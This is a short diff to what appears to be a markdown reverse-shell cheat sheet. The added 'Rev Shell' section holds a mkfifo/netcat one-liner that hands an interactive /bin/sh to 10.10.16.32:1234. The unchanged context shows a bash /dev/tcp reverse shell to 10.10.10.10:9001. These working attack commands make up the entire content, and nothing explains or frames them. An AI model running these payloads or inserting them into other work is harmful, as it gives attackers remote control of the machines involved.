@@ -2,6 +2,11 @@
 
 ## Linux
 
+### Rev Shell
+```bash
+ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.32 1234 >/tmp/f
+```
+
 ### Bash -i
 ```bash
 sh -i >& /dev/tcp/10.10.10.10/9001 0>&1
